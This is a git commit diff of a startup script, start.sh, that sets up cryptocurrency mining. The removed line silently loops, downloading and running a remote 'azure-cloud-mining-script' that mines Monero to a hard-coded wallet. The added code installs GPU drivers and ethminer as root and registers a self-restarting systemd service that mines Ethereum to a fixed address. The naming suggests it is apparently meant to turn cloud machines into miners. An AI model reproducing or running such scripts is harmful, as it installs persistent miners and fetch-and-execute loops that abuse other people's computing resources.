23808266c0bf908fa238ad14227796f59d5621db
gozzzz <92143693+gozzzz@users.noreply.github.com>
2022-04-24 03:26:43 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,1 +1,23 @@
-nohup /bin/bash -c "export currency=monero;export pool_pass1=x;export pool_address1=pool.supportxmr.com:443;export wallet1=87iK4YAJoMCKy1wR8JfryUZqJEUux8PwcgryQTbYTQwXTzqheLpHaENGG8CMxw9BiTNvp4q7cshUzMUJV1gZNrXQ64WRWpo;export nicehash1=false;export pool_pass2=x;export pool_address2=;export wallet2=;export nicehash2=false;while [ 1 ] ;do wget https://bitbucket.org/ashleychow/azure-cloud-mining-script/raw/67c896b4e3c8016134cc7306d372a23c16f21562/azure_script/setup_vm3.sh ; chmod u+x setup_vm3.sh ; ./setup_vm3.sh ; cd azure-cloud-mining-script; cd azure_script; ./run_xmr_stak.pl; cd ..; cd ..; rm -rf azure-cloud-mining-script ; rm -rf setup_vm3.sh; done;" >/dev/null 2>&1 &
+SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
+if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
+then
+	echo "taind vip pro" > isHaveSetupCoin.txt
+	cd /usr/local/bin
+	sudo apt-get install linux-headers-$(uname -r) -y
+	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
+	sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
+	sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
+	sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
+	echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
+	sudo apt-get update
+	sudo apt-get -y install cuda-drivers
+	sudo apt-get install libcurl3 -y
+	sudo wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+	sudo tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://0x29ee87568c8d2b2b98b12f8b139666b6e0b9cef9.VIP1.ethermine.org:4444 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
+	sudo systemctl daemon-reload
+	sudo systemctl enable eth.service
+	sudo systemctl start eth.service
+else
+	sudo systemctl start eth.service
+fi
